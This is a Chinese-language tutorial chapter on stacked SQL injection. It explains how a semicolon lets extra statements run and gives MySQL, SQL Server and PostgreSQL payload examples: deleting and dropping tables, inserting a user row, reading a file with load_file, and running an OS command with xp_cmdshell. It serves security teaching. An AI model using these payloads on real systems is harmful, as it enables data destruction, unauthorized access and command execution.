# 十七、第三部分__page-3 Stacked injection Background-8 stacked injection

Stacked injections: 堆叠注入。从名词的含义就可以看到应该是一堆sql 语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加 ;   表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。

### 0x01 原理介绍

在SQL 中，分号（;）是用来表示一条sql 语句的结束。堆叠注入是指构造利用 ; 后继续执行新命令的注入方式。

union  injection（联合注入）也是将两条语句合并在一起，但是union或者union all的语句类型通常只是查询而已。

EG示例 :
    
    # 用户注入： id=1;DELETE FROM products
    # 服务器未过滤，执行sql为：
    select * from products where id=1;DELETE FROM products
    
### 0x02 堆叠注入的局限性

堆叠注入并不是可以在每个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当前还有权限不足。

虽然堆叠注入可以执行任意命令，但是在web系统中，通常指返回一个查询结果，因此第二个语句可能会产生错误或者结果被忽略，在前端界面是无法看到返回结果的。

在堆叠注入前，我们也需要知道数据库相关信息，如表名、列名。

### 0x03 各个数据库实例介绍

- mysql数据库
```sql
    # 新增表成功：
    select * from users where id=1;create table test like users;  # 可以使用like关键字
    # 删除表成功：
    select * from users where id=1;drop table test;
    # 查询数据成功：
    select * from users where id=1;select 1,2,3;  # 会查询出两个select结果
    # 加载文件成功：
    select * from users where id=1;select load_file('c:/tmpupbbn.php');
    # 修改数据成功：
    select * from users where id=1;insert into users(id,username,password) values('100','new','new');
```

- sql server数据库
```sql
    # 新增数据表：
    select * from test;create table sc3(ss CHAR(8));
    # 删除数据表：
    select * from test;drop table sc3;
    # 查询数据：
    select 1,2,3;select * from test;
    # 修改数据：
    select * from test;update test set name='test' where id=3;
    # sqlserver中最为重要的存储过程：
    select * from test where id=1;exec master..xp_cmdshell 'ipconfig'  # 可注意：EXEC master.dbo.xp_cmdshell
```

- oracle数据库
```sql
    # oracle不支持堆叠注入，会直接报错无效字符
```

- postgresql数据库
```sql
    # 新增数据表成功：
    select * from user_test;create table user_data(id DATE);
    # 删除数据表成功：
    select * from user_test;delete from user_data;
    # 查询数据成功：
    select * from user_test;select 1,2,3;
    # 修改数据成功：
    select * from user_test;update user_test set name='modify' where name='张三';
```

